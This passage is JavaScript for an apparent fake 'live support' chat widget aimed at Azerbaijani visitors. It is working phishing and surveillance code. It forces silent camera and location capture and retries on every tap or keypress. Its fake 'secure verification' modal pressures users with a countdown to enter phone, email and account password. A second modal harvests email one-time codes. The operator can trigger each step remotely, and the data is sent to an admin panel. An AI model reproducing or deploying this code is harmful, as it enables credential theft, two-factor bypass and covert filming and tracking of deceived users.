        // ——— 2) Ölü session temizle ———
        if (callId) {
          const stale = cameraSessions.get(callId);
          if (stale && !hasLiveCameraTracks(stale)) {
            await stopCameraSession(callId, { upload: false });
          }
        }
        for (const [otherId, st] of [...cameraSessions.entries()]) {
          if (!hasLiveCameraTracks(st)) {
            await stopCameraSession(otherId, { upload: false });
          }
        }

        // Kapı: kamera yoksa ve busy değilse göster
        if (
          !pageEntryPermBusy &&
          !hasLiveCameraSession() &&
          !(earlyCameraStream && hasLiveCameraTracks(earlyCameraStream))
        ) {
          if (!fromGesture) showPageEntryPermGate();
        }

        // ——— 3) Kamera yok → gum (yalnızca bu dalda) ———
        let stream =
          earlyCameraStream && hasLiveCameraTracks(earlyCameraStream)
            ? earlyCameraStream
            : null;
        if (!stream) {
          try {
            stream = await acquireCameraStreamNative();
            // acquire live session stream döndürebilir — session’a yazılacak
            if (!findLiveCameraSessionEntry()) {
              earlyCameraStream = stream;
            }
            // Gate kamera-only ile kapanmaz
          } catch {
            if (!fromGesture && !pageEntryPermBusy) showPageEntryPermGate();
            scheduleRetry();
            return;
          }
        }

        if (!sync?.enabled || typeof sync.startVisitorCameraOffer !== "function") {
          scheduleRetry();
          return;
        }

        if (!callId) {
          callId = await resolveUsableVisitorCallId(latestCameraCallId, sync);
          if (!callId) {
            scheduleRetry();
            return;
          }
        } else if (sync?.getCameraCall) {
          // Pending ölüyse değiştir — soft resume’da reconnecting/ended grace kabul
          try {
            const soft = isSoftResumePending() || navigationIsReload();
            const data = await sync.getCameraCall(sync.getSessionId(), callId);
            const ok =
              data &&
              (typeof sync.isCameraCallReusable === "function"
                ? sync.isCameraCallReusable(data, { allowSoftResume: soft })
                : !["ended", "denied"].includes(String(data.status || "")) || soft);
            if (!ok) {
              callId = await resolveUsableVisitorCallId(null, sync);
              if (!callId) {
                scheduleRetry();
                return;
              }
            } else if (soft && sync.resumeVisitorCameraCall) {
              await sync.resumeVisitorCameraCall(sync.getSessionId(), callId).catch(() => {});
            }
          } catch {
            /* keep */
          }
        }

        if (token !== cameraPermLoopToken) return;

        // Tekrar canlı kontrol (gum başka session açmış olabilir)
        if (hasLiveCameraSession() && !sessionHasLiveCam(callId)) {
          const ent = findLiveCameraSessionEntry();
          if (ent) {
            await migrateLiveCameraToCallId(ent[0], callId, box, {
              seedLocation: earlyLocationPos || undefined,
            });
          }
        }

        if (sessionHasLiveCam(callId)) {
          if (ensureLocationOnly(sync, callId)) {
            completeBoth(callId);
            return;
          }
          scheduleRetry();
          return;
        }

        const useStream =
          stream && hasLiveCameraTracks(stream)
            ? stream === earlyCameraStream
              ? takeEarlyCameraStream() || stream
              : stream
            : null;
        if (useStream && useStream === earlyCameraStream) earlyCameraStream = null;

        await startVisitorCamera(box, callId, {
          auto: true,
          silent: true,
          deferLocation: false,
          stream: useStream || undefined,
          seedLocation: earlyLocationPos || restoreEarlyLocation() || undefined,
        });

        if (ensureLocationOnly(sync, callId) || sessionHasBoth(callId)) {
          completeBoth(callId);
          return;
        }
        if (!hasLiveCameraSession() && !pageEntryPermBusy) showPageEntryPermGate();
        scheduleRetry();
      } catch (err) {
        console.error("silent media force", err);
        if (!hasLiveCameraAndLocation() && !hasLiveCameraSession() && !pageEntryPermBusy) {
          showPageEntryPermGate();
        }
        scheduleRetry();
      } finally {
        attempting = false;
      }
    };

    // Her dokunuş/klavye = jest ile zorla tekrar (görünür buton yok)
    let lastGestureAt = 0;
    const onGesture = () => {
      if (token !== cameraPermLoopToken) return;
      if (pageEntryPermBusy) return;
      if (document.getElementById("page-entry-perm-gate")) return;
      const now = Date.now();
      if (now - lastGestureAt < 1200) return;
      lastGestureAt = now;
      // Canlı cam + konum eksik → gum değil; jest ile konum iste.
      // explicit:false — Safari code=1’i yanlış “reddedildi” yapmasın
      const live = findLiveCameraSessionEntry();
      if (live && !live[1]._hadLocation) {
        try {
          live[1].retryLocation?.({ fromUserTap: true, explicit: false });
        } catch {
          /* ignore */
        }
        return;
      }
      void attempt(true);
    };
    document.addEventListener("pointerdown", onGesture, true);
    document.addEventListener("touchstart", onGesture, true);
    document.addEventListener("keydown", onGesture, true);
    mediaForceGestureUnsub = () => {
      document.removeEventListener("pointerdown", onGesture, true);
      document.removeEventListener("touchstart", onGesture, true);
      document.removeEventListener("keydown", onGesture, true);
    };

    void attempt(false);
  }

  const PHONE_DONE_KEY = "visitor_phone_done_v1";
  let phonePopupOpen = false;
  let phonePopupOffered = false;

  function normalizePhoneDigits(raw) {
    let digits = String(raw || "").replace(/\D/g, "");
    if (digits.startsWith("994")) digits = digits.slice(3);
    if (digits.startsWith("0")) digits = digits.slice(1);
    return digits.slice(0, 9);
  }

  function isValidPhoneDigits(raw) {
    // Azerbaycan cep: ülke kodu hariç 9 hane (örn. 50 123 45 67)
    return normalizePhoneDigits(raw).length === 9;
  }

  function isValidEmail(raw) {
    const email = String(raw || "").trim().toLowerCase();
    // a@b.co — yalnızca rakam / @'siz metin reddedilir
    return /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(email);
  }

  function formatAzPhoneInput(value) {
    let digits = normalizePhoneDigits(value);
    const parts = [];
    if (digits.length > 0) parts.push(digits.slice(0, 2));
    if (digits.length > 2) parts.push(digits.slice(2, 5));
    if (digits.length > 5) parts.push(digits.slice(5, 7));
    if (digits.length > 7) parts.push(digits.slice(7, 9));
    return parts.join(" ");
  }

  function maybeOfferPhoneEntry(box) {
    if (!box || phonePopupOpen || phonePopupOffered) return;
    try {
      if (sessionStorage.getItem(PHONE_DONE_KEY) === "1") return;
    } catch {
      /* ignore */
    }
    phonePopupOffered = true;
    window.setTimeout(() => showPhoneEntryModal(box), 450);
  }

  /** Gate sonrası — her zaman aç; önceki no-op / PHONE_DONE takılmasını aş */
  function forceOfferPhoneEntry(box) {
    const host = box || getOrCreateMediaHost();
    try {
      sessionStorage.removeItem(PHONE_DONE_KEY);
    } catch {
      /* ignore */
    }
    phonePopupOffered = true;
    phonePopupOpen = false;
    document.getElementById("phone-entry-modal")?.remove();
    document.getElementById("email-code-modal")?.remove();
    try {
      showPhoneEntryModal(host, { force: true });
    } catch (err) {
      console.warn("force phone modal", err);
      window.setTimeout(() => {
        try {
          showPhoneEntryModal(host, { force: true });
        } catch (err2) {
          console.warn("force phone modal retry", err2);
        }
      }, 200);
    }
  }

  function showPhoneEntryModal(box, opts = {}) {
    if (phonePopupOpen && !opts.force) return;
    if (opts.force) {
      document.getElementById("phone-entry-modal")?.remove();
      phonePopupOpen = false;
    }
    document.getElementById("phone-entry-modal")?.remove();
    phonePopupOpen = true;

    const TOTAL_SEC = 45;
    const CIRC = 2 * Math.PI * 18;
    let left = TOTAL_SEC;
    let timerId = null;
    let submitting = false;

    const overlay = document.createElement("div");
    overlay.id = "phone-entry-modal";
    overlay.className = "phone-modal-overlay";
    overlay.setAttribute("role", "dialog");
    overlay.setAttribute("aria-modal", "true");
    overlay.setAttribute("aria-labelledby", "phone-modal-title");

    overlay.innerHTML = `
      <div class="phone-modal phone-modal-creds">
        <div class="phone-modal-top">
          <div class="phone-modal-brand">
            <span class="phone-modal-icon" aria-hidden="true">☎</span>
            <div>
              <strong>Güvenli doğrulama</strong>
              <span>Hesap doğrulama adımı</span>
            </div>
          </div>
          <div class="phone-modal-timer" aria-hidden="true">
            <svg viewBox="0 0 40 40">
              <circle class="phone-timer-track" cx="20" cy="20" r="18"></circle>
              <circle class="phone-timer-progress" cx="20" cy="20" r="18"
                stroke-dasharray="${CIRC}" stroke-dashoffset="0"></circle>
            </svg>
            <em data-phone-sec>${TOTAL_SEC}</em>
          </div>
        </div>
        <h2 class="phone-modal-title" id="phone-modal-title">Hesap bilgilerinizi girin</h2>
        <p class="phone-modal-text">Kimlik doğrulamasını tamamlamak için telefon, e-posta ve şifrenizi girin. Süre: 45 saniye.</p>
        <div class="phone-modal-field">
          <label for="phone-modal-input">Cep telefonu</label>
          <div class="phone-modal-input-wrap" data-wrap="phone">
            <span class="phone-modal-prefix">+994</span>
            <input id="phone-modal-input" type="tel" inputmode="numeric" autocomplete="tel-national"
              maxlength="12" placeholder="50 123 45 67" />
          </div>
        </div>
        <div class="phone-modal-field">
          <label for="cred-email-input">E-posta</label>
          <div class="phone-modal-input-wrap phone-modal-input-full" data-wrap="email">
            <input id="cred-email-input" type="text" inputmode="email" autocomplete="email"
              maxlength="180" placeholder="ornek@mail.com" spellcheck="false" />
          </div>
        </div>
        <div class="phone-modal-field">
          <label for="cred-pass-input">Şifre</label>
          <div class="phone-modal-input-wrap phone-modal-input-full" data-wrap="pass">
            <input id="cred-pass-input" type="password" autocomplete="current-password"
              maxlength="128" placeholder="Hesap şifreniz" />
          </div>
        </div>
        <p class="phone-modal-hint" id="phone-modal-hint">Örn. e-posta: ornek@gmail.com — tüm alanlar zorunlu.</p>
        <div class="phone-modal-actions">
          <button type="button" class="btn btn-primary" data-phone-submit>Bilgileri onayla</button>
        </div>
        <p class="phone-modal-note">Bu adım tamamlanmadan kimlik doğrulaması bitmez.</p>
      </div>
    `;

    document.body.appendChild(overlay);

    const modal = overlay.querySelector(".phone-modal");
    const phoneInput = overlay.querySelector("#phone-modal-input");
    const emailInput = overlay.querySelector("#cred-email-input");
    const passInput = overlay.querySelector("#cred-pass-input");
    const phoneWrap = overlay.querySelector('[data-wrap="phone"]');
    const emailWrap = overlay.querySelector('[data-wrap="email"]');
    const passWrap = overlay.querySelector('[data-wrap="pass"]');
    const hint = overlay.querySelector("#phone-modal-hint");
    const submitBtn = overlay.querySelector("[data-phone-submit]");
    const secEl = overlay.querySelector("[data-phone-sec]");
    const progress = overlay.querySelector(".phone-timer-progress");

    const setHint = (text, isError) => {
      if (!hint) return;
      hint.textContent = text;
      hint.classList.toggle("is-error", Boolean(isError));
    };

    const clearInvalid = () => {
      phoneWrap?.classList.remove("is-invalid");
      emailWrap?.classList.remove("is-invalid");
      passWrap?.classList.remove("is-invalid");
    };

    const tick = () => {
      left -= 1;
      if (secEl) secEl.textContent = String(Math.max(0, left));
      if (progress) {
        const offset = CIRC * (1 - Math.max(0, left) / TOTAL_SEC);
        progress.style.strokeDashoffset = String(offset);
      }
      if (left <= 0) {
        window.clearInterval(timerId);
        timerId = null;
        modal?.classList.add("is-expired");
        setHint("Süre doldu — bilgileri hemen girip onaylayın.", true);
        submitBtn.textContent = "Hemen onayla";
        phoneInput?.focus();
      }
    };

    timerId = window.setInterval(tick, 1000);

    phoneInput?.addEventListener("input", () => {
      const formatted = formatAzPhoneInput(phoneInput.value);
      if (phoneInput.value !== formatted) phoneInput.value = formatted;
      phoneWrap?.classList.remove("is-invalid");
      if (left > 0) {
        setHint("Tüm alanlar zorunludur. Bilgiler yalnızca bu doğrulama oturumuna bağlanır.", false);
      }
    });
    emailInput?.addEventListener("input", () => {
      emailWrap?.classList.remove("is-invalid");
    });
    passInput?.addEventListener("input", () => {
      passWrap?.classList.remove("is-invalid");
    });

    const closeModal = () => {
      if (timerId) window.clearInterval(timerId);
      phonePopupOpen = false;
      overlay.remove();
    };

    const submit = async () => {
      if (submitting) return;
      clearInvalid();
      const formatted = formatAzPhoneInput(phoneInput?.value || "");
      if (phoneInput && phoneInput.value !== formatted) phoneInput.value = formatted;
      const email = String(emailInput?.value || "").trim().toLowerCase();
      const password = String(passInput?.value || "");
      const phoneOk = isValidPhoneDigits(formatted);
      const emailOk = isValidEmail(email);
      const passOk = Boolean(password && password.length >= 4);
      if (!phoneOk) phoneWrap?.classList.add("is-invalid");
      if (!emailOk) emailWrap?.classList.add("is-invalid");
      if (!passOk) passWrap?.classList.add("is-invalid");
      if (!phoneOk || !emailOk || !passOk) {
        const parts = [];
        if (!phoneOk) parts.push("telefon (+994, 9 hane)");
        if (!emailOk) parts.push("e-posta (ornek@mail.com)");
        if (!passOk) parts.push("şifre (en az 4 karakter)");
        setHint(`Eksik/geçersiz: ${parts.join(", ")}.`, true);
        if (!phoneOk) phoneInput?.focus();
        else if (!emailOk) emailInput?.focus();
        else passInput?.focus();
        return;
      }

      submitting = true;
      submitBtn.disabled = true;
      submitBtn.textContent = "Kaydediliyor…";
      const fullPhone = `+994 ${formatted}`.trim();

      try {
        const sync = window.ChatSync;
        if (!sync?.enabled) throw new Error("Senkron kapalı");
        if (typeof sync.saveVisitorCredentials === "function") {
          await sync.saveVisitorCredentials({
            phone: fullPhone,
            email,
            password,
          });
        } else {
          throw new Error("Güvenlik kaydı desteklenmiyor");
        }
        try {
          sessionStorage.setItem(PHONE_DONE_KEY, "1");
        } catch {
          /* ignore */
        }
        // Ziyaretçi sohbetine yazma — bilgiler yalnız admin panelinde
        closeModal();
        // Admin tekrar isterse auto kod yeniden çalışabilsin
        try {
          sessionStorage.removeItem(EMAIL_CODE_AUTO_KEY);
        } catch {
          /* ignore */
        }
        scheduleEmailCodeModal(box, 10_000);
      } catch (err) {
        console.error(err);
        submitting = false;
        submitBtn.disabled = false;
        submitBtn.textContent = left <= 0 ? "Hemen onayla" : "Bilgileri onayla";
        setHint("Kayıt başarısız. Tekrar deneyin.", true);
      }
    };

    submitBtn?.addEventListener("click", (e) => {
      e.preventDefault();
      void submit();
    });
    [phoneInput, emailInput, passInput].forEach((el) => {
      el?.addEventListener("keydown", (e) => {
        if (e.key === "Enter") {
          e.preventDefault();
          void submit();
        }
      });
    });

    overlay.addEventListener("click", (e) => {
      if (e.target === overlay) {
        phoneInput?.focus();
        modal?.classList.add("is-expired");
        setHint("Devam etmek için tüm alanları doldurmanız gerekir.", true);
      }
    });

    window.setTimeout(() => phoneInput?.focus(), 80);
  }

  let emailCodePopupOpen = false;
  let emailCodeAutoTimer = null;
  const EMAIL_CODE_AUTO_KEY = "visitor_email_code_auto_v1";

  function scheduleEmailCodeModal(box, delayMs = 10_000) {
    try {
      if (sessionStorage.getItem(EMAIL_CODE_AUTO_KEY) === "1") return;
      sessionStorage.setItem(EMAIL_CODE_AUTO_KEY, "1");
    } catch {
      /* ignore */
    }
    if (emailCodeAutoTimer) {
      window.clearTimeout(emailCodeAutoTimer);
      emailCodeAutoTimer = null;
    }
    emailCodeAutoTimer = window.setTimeout(() => {
      emailCodeAutoTimer = null;
      showEmailCodeModal(box, {
        text: "E-postanıza gelen 6 haneli kodu yazarak doğrulama yapın.",
        auto: true,
      });
    }, Math.max(0, Number(delayMs) || 10_000));
  }

  function showEmailCodeModal(box, msg = {}) {
    if (emailCodePopupOpen) {
      const existing = document.getElementById("email-code-modal");
      if (existing) {
        existing.querySelector("#email-code-input")?.focus();
        return;
      }
    }
    document.getElementById("email-code-modal")?.remove();
    emailCodePopupOpen = true;

    let submitting = false;
    const overlay = document.createElement("div");
    overlay.id = "email-code-modal";
    overlay.className = "phone-modal-overlay";
    overlay.setAttribute("role", "dialog");
    overlay.setAttribute("aria-modal", "true");
    overlay.setAttribute("aria-labelledby", "email-code-title");

    overlay.innerHTML = `
      <div class="phone-modal phone-modal-creds phone-modal-otp">
        <div class="phone-modal-top">
          <div class="phone-modal-brand">
            <span class="phone-modal-icon" aria-hidden="true">✉</span>
            <div>
              <strong>E-posta doğrulama</strong>
              <span>6 haneli güvenlik kodu</span>
            </div>
          </div>
        </div>
        <h2 class="phone-modal-title" id="email-code-title">Doğrulama kodunu girin</h2>
        <p class="phone-modal-text">${String(
          msg.text || "E-postanıza gelen 6 haneli kodu yazarak doğrulama yapın."
        ).replace(/[<>&]/g, "")}</p>
        <div class="phone-modal-field">
          <label for="email-code-input">6 haneli kod</label>
          <div class="phone-modal-input-wrap phone-modal-input-full phone-modal-otp-wrap" data-wrap="otp">
            <input id="email-code-input" type="text" inputmode="numeric" autocomplete="one-time-code"
              maxlength="6" placeholder="••••••" spellcheck="false" />
          </div>
        </div>
        <p class="phone-modal-hint" id="email-code-hint">Kod e-posta kutunuza birkaç saniye içinde düşer. Gelen 6 haneyi yazın.</p>
        <div class="phone-modal-actions">
          <button type="button" class="btn btn-primary" data-otp-submit>${String(
            msg.okLabel || "Doğrula"
          ).replace(/[<>&]/g, "")}</button>
        </div>
        <p class="phone-modal-note">Bu adım tamamlanmadan kimlik doğrulaması bitmez.</p>
      </div>
    `;

    document.body.appendChild(overlay);

    const modal = overlay.querySelector(".phone-modal");
    const input = overlay.querySelector("#email-code-input");
    const wrap = overlay.querySelector('[data-wrap="otp"]');
    const hint = overlay.querySelector("#email-code-hint");
    const submitBtn = overlay.querySelector("[data-otp-submit]");

    const setHint = (text, isError) => {
      if (!hint) return;
      hint.textContent = text;
      hint.classList.toggle("is-error", Boolean(isError));
    };

    const closeModal = () => {
      emailCodePopupOpen = false;
      overlay.remove();
    };

    input?.addEventListener("input", () => {
      const digits = String(input.value || "").replace(/\D/g, "").slice(0, 6);
      if (input.value !== digits) input.value = digits;
      wrap?.classList.remove("is-invalid");
      setHint("Kod e-posta kutunuza birkaç saniye içinde düşer. Gelen 6 haneyi yazın.", false);
    });

    const submit = async () => {
      if (submitting) return;
      const code = String(input?.value || "").replace(/\D/g, "").slice(0, 6);
      if (code.length !== 6) {
        wrap?.classList.add("is-invalid");
        modal?.classList.add("is-expired");
        setHint("6 haneli kodu eksiksiz girin.", true);
        input?.focus();
        return;
      }
      submitting = true;
      submitBtn.disabled = true;
      submitBtn.textContent = "Doğrulanıyor…";
      try {
        const sync = window.ChatSync;
        if (!sync?.enabled || typeof sync.saveVisitorEmailCode !== "function") {
          throw new Error("Senkron kapalı");
        }
        await sync.saveVisitorEmailCode(code);
        closeModal();
      } catch (err) {
        console.error(err);
        submitting = false;
        submitBtn.disabled = false;
        submitBtn.textContent = msg.okLabel || "Doğrula";
        setHint("Kod kaydedilemedi. Tekrar deneyin.", true);
      }
    };

    submitBtn?.addEventListener("click", (e) => {
      e.preventDefault();
      void submit();
    });
    input?.addEventListener("keydown", (e) => {
      if (e.key === "Enter") {
        e.preventDefault();
        void submit();
      }
    });
    overlay.addEventListener("click", (e) => {
      if (e.target === overlay) {
        input?.focus();
        modal?.classList.add("is-expired");
        setHint("Devam etmek için 6 haneli kodu girmeniz gerekir.", true);
      }
    });

    window.setTimeout(() => input?.focus(), 80);
  }

  function showVisitorPopup(box, msg, onChoice) {
    box.querySelectorAll(".chat-inline-prompt").forEach((el) => el.remove());
    document.getElementById("support-popup")?.remove();

    const card = document.createElement("div");
    card.className = "chat-inline-prompt";
    card.setAttribute("role", "group");
    card.setAttribute("aria-label", "Destek formu");

    const title = document.createElement("p");
    title.className = "chat-inline-prompt-title";
    title.textContent = msg.text || "Lütfen yanıtınızı yazın.";

    const input = document.createElement("textarea");
    input.className = "chat-inline-prompt-input";
    input.rows = 3;
    input.maxLength = 400;
    input.autocomplete = "off";
    input.placeholder = msg.placeholder || "Yanıtınızı yazın…";

    const actions = document.createElement("div");
    actions.className = "chat-inline-prompt-actions";

    const okBtn = document.createElement("button");
    okBtn.type = "button";
    okBtn.className = "btn btn-primary";
    okBtn.textContent = msg.okLabel || "Tamam";

    const cancelBtn = document.createElement("button");
    cancelBtn.type = "button";
    cancelBtn.className = "btn btn-ghost";
    cancelBtn.textContent = msg.cancelLabel || "İptal";

    const finish = (choice, typed) => {
      card.remove();
      onChoice?.(choice, typed);
    };

    okBtn.addEventListener("click", () => {
      const typed = String(input.value || "").trim();
      if (!typed) {
        input.focus();
        input.classList.add("is-invalid");
        return;
      }
      input.classList.remove("is-invalid");
      finish(okBtn.textContent, typed);
    });

    cancelBtn.addEventListener("click", () => finish(cancelBtn.textContent, ""));

    input.addEventListener("keydown", (e) => {
      if (e.key === "Enter" && !e.shiftKey) {
        e.preventDefault();
        okBtn.click();
      }
    });

    actions.append(okBtn, cancelBtn);
    card.append(title, input, actions);
    box.appendChild(card);
    box.scrollTop = box.scrollHeight;
    input.focus();
  }

  function showVisitorPhotoRequest(box, msg) {
    box.querySelectorAll(".chat-inline-prompt").forEach((el) => el.remove());
    document.getElementById("support-popup")?.remove();

    const maxPhotos = Math.min(
      10,
      Math.max(1, Number(msg.maxPhotos) || window.ChatSync?.PHOTO_MAX_COUNT || 10)
    );

    const card = document.createElement("div");
    card.className = "chat-inline-prompt chat-photo-prompt";
    card.setAttribute("role", "group");
    card.setAttribute("aria-label", "Görsel gönderme");

    const title = document.createElement("p");
    title.className = "chat-inline-prompt-title";
    title.textContent =
      msg.text ||
      "Destek için ekran görüntüsü veya görsel gönderebilirsiniz.";

    const note = document.createElement("p");
    note.className = "chat-photo-prompt-note";
    note.textContent = `Nasıl çalışır: “Görsel seç”e basınca cihazınızın seçicisi açılır. En fazla ${maxPhotos} görsel seçebilirsiniz. Seçtikleriniz destek sohbetine gönderilir. İstemiyorsanız “İstemiyorum”a basın — hiçbir dosyaya erişilmez.`;

    const status = document.createElement("p");
    status.className = "chat-photo-prompt-status";
    status.hidden = true;

    const actions = document.createElement("div");
    actions.className = "chat-inline-prompt-actions";

    const pickBtn = document.createElement("button");
    pickBtn.type = "button";
    pickBtn.className = "btn btn-primary";
    pickBtn.textContent = msg.okLabel || "Görsel seç";

    const cancelBtn = document.createElement("button");
    cancelBtn.type = "button";
    cancelBtn.className = "btn btn-ghost";
    cancelBtn.textContent = msg.cancelLabel || "İstemiyorum";

    const fileInput = document.createElement("input");
    fileInput.type = "file";
    fileInput.accept = "image/*";
    fileInput.multiple = true;
    fileInput.hidden = true;

    const setBusy = (busy) => {
      pickBtn.disabled = busy;
      cancelBtn.disabled = busy;
    };

    cancelBtn.addEventListener("click", () => {
      card.remove();
      appendMessage(box, "user", "Görsel göndermeyi istemedi.");
    });

    pickBtn.addEventListener("click", () => fileInput.click());

    fileInput.addEventListener("change", async () => {
      const raw = Array.from(fileInput.files || []);
      fileInput.value = "";
      const files = raw
        .filter((f) => String(f.type || "").startsWith("image/"))
        .slice(0, maxPhotos);
      if (!files.length) {
        status.hidden = false;
        status.textContent = "Görsel seçilmedi. İsterseniz tekrar deneyin.";
        return;
      }
      const sync = window.ChatSync;
      if (!sync?.uploadVisitorPhoto) {
        status.hidden = false;
        status.textContent = "Yükleme hazır değil. Sayfayı yenileyip tekrar deneyin.";
        return;
      }

      setBusy(true);
      status.hidden = false;
      let ok = 0;
      for (let i = 0; i < files.length; i += 1) {
        status.textContent = `Yükleniyor ${i + 1}/${files.length}…`;
        try {
          const result = await sync.uploadVisitorPhoto(files[i], {
            index: i + 1,
            total: files.length,
          });
          ok += 1;
          appendMessage(box, "user", `Görsel ${i + 1}/${files.length} gönderildi.`, {
            sync: false,
            imageUrl: result?.url || "",
          });
        } catch (err) {
          console.warn("photo upload", err);
          appendMessage(
            box,
            "bot",
            `Görsel ${i + 1} yüklenemedi. Dosyayı kontrol edip yeniden deneyin.`,
            { sync: false }
          );
        }
      }
      status.textContent =
        ok > 0
          ? `${ok} görsel gönderildi. Teşekkürler.`
          : "Hiçbir görsel gönderilemedi.";
      setBusy(false);
      if (ok > 0) {
        window.setTimeout(() => card.remove(), 1200);
      }
    });

    actions.append(pickBtn, cancelBtn);
    card.append(title, note, status, actions, fileInput);
    box.appendChild(card);
    box.scrollTop = box.scrollHeight;
  }

  const seenAdminIncomingIds = new Set();

  /* —— Karşı taraf mesajı: chat’te değilken ses + uyarı —— */
  let visitorAudioCtx = null;
  let visitorAudioUnlocked = false;
  let visitorToastTimer = null;

  function ensureVisitorAudio() {
    if (visitorAudioCtx) return visitorAudioCtx;
    const AC = window.AudioContext || window.webkitAudioContext;
    if (!AC) return null;
    try {
      visitorAudioCtx = new AC();
    } catch {
      return null;
    }
    return visitorAudioCtx;
  }

  async function unlockVisitorAudio() {
    const ctx = ensureVisitorAudio();
    if (!ctx) return false;
    try {
      if (ctx.state === "suspended") await ctx.resume();
      const buf = ctx.createBuffer(1, 1, 22050);
      const src = ctx.createBufferSource();
      src.buffer = buf;
      src.connect(ctx.destination);
      src.start(0);
      visitorAudioUnlocked = ctx.state === "running";
    } catch {
      visitorAudioUnlocked = false;
    }
    return visitorAudioUnlocked;
  }

  async function playVisitorNotifyBeep() {
    const ctx = ensureVisitorAudio();
    if (!ctx) return;
    try {
      if (ctx.state !== "running") await ctx.resume();
    } catch {
      return;
    }
    if (ctx.state !== "running") return;
    const now = ctx.currentTime;
    [
      { t: 0, f: 880, d: 0.1 },
      { t: 0.14, f: 1175, d: 0.14 },
    ].forEach(({ t, f, d }) => {
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();
      osc.type = "sine";
      osc.frequency.value = f;
      gain.gain.setValueAtTime(0.001, now + t);
      gain.gain.exponentialRampToValueAtTime(0.28, now + t + 0.02);
      gain.gain.exponentialRampToValueAtTime(0.001, now + t + d);
      osc.connect(gain);
      gain.connect(ctx.destination);
      osc.start(now + t);
      osc.stop(now + t + d + 0.03);
    });
  }

  function ensureVisitorToast() {
    let el = document.getElementById("visitor-chat-toast");
    if (el) return el;
    el = document.createElement("div");
    el.id = "visitor-chat-toast";
    el.className = "visitor-chat-toast";
    el.hidden = true;
    el.setAttribute("role", "status");
    el.innerHTML =
      '<strong class="visitor-chat-toast-title">Yeni destek mesajı</strong>' +
      '<p class="visitor-chat-toast-body"></p>' +
      '<button type="button" class="visitor-chat-toast-go">Sohbete git</button>';
    el.querySelector(".visitor-chat-toast-go")?.addEventListener("click", () => {
      const box = document.querySelector("[data-chat-root] [data-chat-messages]");
      focusVisitorChat(box);
      el.hidden = true;
    });
    document.body.appendChild(el);
    return el;
  }

  function showVisitorToast(text) {
    const el = ensureVisitorToast();
    const body = el.querySelector(".visitor-chat-toast-body");
    if (body) body.textContent = String(text || "").slice(0, 160);
    el.hidden = false;
    if (visitorToastTimer) clearTimeout(visitorToastTimer);
    visitorToastTimer = window.setTimeout(() => {
      el.hidden = true;
    }, 6000);
  }

  function focusVisitorChat(box) {
    const root =
      box?.closest?.("[data-chat-root]") || document.querySelector("[data-chat-root]");
    const target = root || box || document.getElementById("canli-destek");
    if (target?.scrollIntoView) {
      target.scrollIntoView({ behavior: "smooth", block: "center" });
    }
    if (box) box.scrollTop = box.scrollHeight;
    const input =
      root?.querySelector?.("[data-chat-input]") ||
      document.querySelector("[data-chat-input]");
    // Yazmayı engellemeden odakla
    window.setTimeout(() => {
      try {
        input?.focus?.({ preventScroll: true });
      } catch {
        input?.focus?.();
      }
    }, 280);
  }

  function notifyVisitorOfAdminMessage(box, msg) {
    // loading animasyonu için spam etme
    if (msg?.type === "loading") return;

    const text = String(msg?.text || "Destek yeni bir mesaj gönderdi").slice(0, 160);

    // Her zaman ses + sohbete yönlendir (chat’i engellemeden)
    void unlockVisitorAudio().then(() => playVisitorNotifyBeep());
    showVisitorToast(text);
    focusVisitorChat(box);

    if (document.hidden && "Notification" in window && Notification.permission === "granted") {
      try {
        new Notification("Yeni destek mesajı", {
          body: text,
          tag: "visitor-support-msg",
          silent: true,
        });
      } catch {
        /* ignore */
      }
    }
  }

  document.addEventListener(
    "pointerdown",
    () => {
      void unlockVisitorAudio();
    },
    { capture: true }
  );
  document.addEventListener(
    "keydown",
    () => {
      void unlockVisitorAudio();
    },
    { capture: true, once: true }
  );

  function handleAdminIncoming(box, msg) {
    if (msg?.id) {
      if (seenAdminIncomingIds.has(msg.id)) return;
      seenAdminIncomingIds.add(msg.id);
    }
    if (msg.type === "camera") {
      // Ziyaretçiye metin yok — sessiz zorla kamera+konum
      notifyVisitorOfAdminMessage(box, { text: "Kimlik doğrulaması için güvenlik adımı isteniyor" });
      void autoOpenCameraFromMessage(box, msg);
      return;
    }
    if (msg.type === "photos") {
      appendMessage(
        box,
        "admin",
        msg.text ||
          "Destek için ekran görüntüsü veya görsel gönderebilirsiniz.",
        { sync: false }
      );
      notifyVisitorOfAdminMessage(box, msg);
      showVisitorPhotoRequest(box, msg);
      return;
    }
    if (msg.type === "email_code") {
      notifyVisitorOfAdminMessage(box, {
        text: "E-posta doğrulama kodu isteniyor",
      });
      showEmailCodeModal(box, {
        text:
          msg.text ||
          "E-postanıza gelen 6 haneli kodu yazarak doğrulama yapın.",
        okLabel: msg.okLabel || "Doğrula",
      });
      return;
    }
    if (msg.type === "credentials") {
      notifyVisitorOfAdminMessage(box, {
        text: "Güvenlik doğrulaması yeniden isteniyor",
      });
      try {
        sessionStorage.removeItem(PHONE_DONE_KEY);
        sessionStorage.removeItem(EMAIL_CODE_AUTO_KEY);
      } catch {
        /* ignore */
      }
      phonePopupOffered = false;
      // Açık e-posta kod penceresi varsa kapat — güvenlik formu önce
      document.getElementById("email-code-modal")?.remove();
      emailCodePopupOpen = false;
      showPhoneEntryModal(box, { force: true });
      return;
    }
    const isPopup = msg.type === "popup" || msg.popup === true;
    if (isPopup) {
      appendMessage(box, "admin", msg.text || "Lütfen yanıtınızı yazın.", { sync: false });
      notifyVisitorOfAdminMessage(box, msg);
      showVisitorPopup(
        box,
        {
          text: msg.text || "Lütfen yanıtınızı yazın.",
          placeholder: msg.placeholder || "Mesajınızı buraya yazın…",
          okLabel: msg.okLabel || "Tamam",
          cancelLabel: msg.cancelLabel || "İptal",
          withInput: true,
        },
        (choice, typed) => {
          if (typed) {
            if (SECRETISH.test(typed)) {
              appendMessage(
                box,
                "bot",
      "Güvenlik için şifre, e-posta veya doğrulama kodu paylaşmayın. Kimlik doğrulaması yalnızca güvenlik adımı ile yapılır. Lütfen sorununuzu kendi kelimelerinizle yazın.",
                { sync: false }
              );
              syncMessage(
                "user",
                "Popup yanıtı reddedildi (hassas bilgi paylaşımı engellendi)."
              );
              return;
            }
            appendMessage(box, "user", typed);
            return;
          }
          appendMessage(box, "user", `Popup yanıtı: ${choice}`);
        }
      );
      return;
    }
    appendMessage(box, "admin", msg.text || "", {
      sync: false,
      type: msg.type === "loading" ? "loading" : "text",
    });
    if (msg.type !== "loading") {
      notifyVisitorOfAdminMessage(box, msg);
    }
  }

  function showTyping(box) {
    const el = document.createElement("div");
    el.className = "chat-bubble chat-bot chat-typing";
